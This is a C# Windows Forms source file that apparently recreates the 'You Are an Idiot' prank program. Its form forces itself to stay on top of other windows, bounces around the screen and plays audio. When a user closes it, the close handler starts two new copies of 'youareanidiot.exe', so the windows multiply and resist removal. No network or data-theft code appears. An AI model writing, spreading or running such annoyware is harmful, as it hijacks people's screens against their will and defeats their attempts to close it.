using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace youareanidiot
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);
        public const short SWP_NOMOVE = 0X2;
        public const short SWP_NOSIZE = 1;
        public const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;
        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        public static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        bool paused = false;
        double moveX = 0.0;
        double moveY = 0.0;
        double X = 0.0;
        double Y = 0.0;
        double gravity = 0;
        Random rand = new Random(DateTime.Now.Millisecond);
        bool moving = false;

        public void move()
        {
            
                moveY += gravity;

                X += moveX;
                Y += moveY;
                Location = new Point((int)X, (int)Y);

                //Check Collision
                if (X < 0)
                {
                    X = 0;
                    moveX = -moveX;
                    moveX *= 1;
                    moveY *= 1;
                }
                if (X > Screen.PrimaryScreen.WorkingArea.Width - 1 - Width)
                {
                    X = Screen.PrimaryScreen.WorkingArea.Width - 1 - Width;
                    moveX = -moveX;
                moveX *= 1;
                moveY *= 1;
            }

                if (Y < 0)
                {
                    Y = 0;
                    moveY = -moveY;
                moveX *= 1;
                moveY *= 1;
            }
            if (Y > Screen.PrimaryScreen.WorkingArea.Height - 1 - Height)
            {
                Y = Screen.PrimaryScreen.WorkingArea.Height - 1 - Height;
                moveY = -moveY;
                moveY *= 1;
                moveX *= 1;
            }

            if (Math.Abs(moveX) < 0.1 && Math.Abs(moveY) < 0.5 && DateTime.Now.Second % 3 == 0 && Y > Screen.PrimaryScreen.WorkingArea.Height - 1 - Height - 40)
                {
                    Bounce();
                }
            
        }
        public void Bounce()
        {
            moveX = (rand.NextDouble() + rand.NextDouble()) - 1;
            moveY = -(rand.NextDouble());
            moveX *= 50;
            moveY *= 50;
            X += moveX;
            Y += moveY;
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.Location = new Point(rand.Next(Screen.PrimaryScreen.WorkingArea.Width), rand.Next(Screen.PrimaryScreen.WorkingArea.Height));
            Y = rand.Next(Screen.PrimaryScreen.WorkingArea.Height);
            X = rand.Next(Screen.PrimaryScreen.WorkingArea.Width);
            SetWindowPos(this.Handle, (int)HWND_TOPMOST, ((int)X), (int)Y, (int)X, (int)Y, (int)TOPMOST_FLAGS);
            
            var ea1 = new Thread(new ThreadStart(() =>
            {
                Program.playaudio();
            }));
            ea1.Start();
            moveX = ((rand.NextDouble() + rand.NextDouble()) - 1) * 5;
            moveY = (rand.NextDouble()) * 5;
            
        }
        public Rectangle GetScreen()
        {
            Console.WriteLine(Screen.FromControl(this).Bounds);
            return Screen.FromControl(this).Bounds;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Program.stopaudio();
            Process.Start("youareanidiot.exe");
            Process.Start("youareanidiot.exe");

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            move();
        }
    }
}
